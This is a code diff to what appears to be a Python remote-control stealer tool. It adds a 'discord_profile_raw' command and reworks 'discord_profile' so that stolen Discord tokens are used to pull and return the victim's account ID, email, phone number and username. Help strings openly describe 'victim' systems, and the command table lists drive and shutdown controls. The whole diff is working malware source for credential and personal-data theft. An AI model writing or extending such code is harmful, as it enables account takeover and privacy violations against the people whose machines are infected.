@@ -847,6 +847,23 @@ def command_discord_tokens(_arguments: str, _event) -> str:
     return ",\n".join(_tokens)
 
 
+def command_discord_profile_raw(_arguments: str, _event) -> str:
+    # @function command_discord_profile_raw()
+    # @returns Str
+    # @description Function for command "discord_profile" that returns information about discord (as raw dict (json)) found in system ,(comma).
+
+    # Getting tokens.
+    _tokens = stealer_steal_discord_tokens()
+
+    if len(_tokens) == 0:
+        # If not found any tokens.
+
+        # Error.
+        return "Tokens not found in system!"
+
+    # Returning.
+    return json.dumps(stealer_steal_discord_profile(_tokens), indent=2)
+
 def command_discord_profile(_arguments: str, _event) -> str:
     # @function command_discord_profile()
     # @returns Str
@@ -861,8 +878,14 @@ def command_discord_profile(_arguments: str, _event) -> str:
         # Error.
         return "Tokens not found in system!"
 
+    # Getting profile.
+    _profile = stealer_steal_discord_profile(_tokens)
+    _avatar = f"https://cdn.discordapp.com/avatars/636928558203273216/{_profile['avatar']}.png"
+
     # Returning.
-    return json.dumps(stealer_steal_discord_profile(_tokens), indent=2)
+    return f"[ID{_profile['id']}]\n[{_profile['email']}]\n[{_profile['phone']}]\n{_profile['username']}\n\n{_avatar}"
+
+
 
 
 def executable_get_extension() -> str:
@@ -1228,6 +1251,7 @@ def initialise_commands() -> None:
         "drives": command_drives,
         "discord_tokens": command_discord_tokens,
         "discord_profile": command_discord_profile,
+        "discord_profile_raw": command_discord_profile_raw,
         "tags_new": command_tags_new,
         "tags_add": command_tags_add,
         "shutdown": command_shutdown,
@@ -1246,6 +1270,10 @@ def initialise_commands() -> None:
     }
 
     __COMMANDS_HELP = {
+        "discord_profile_raw": (
+            "Returns you all RAW (as dict (JSON)) information about victim Discord profile",
+            "discord_profile_raw"
+        ),
         "discord_tokens": (
             "Returns you all found Discord tokens in victim system",
             "discord_tokens"
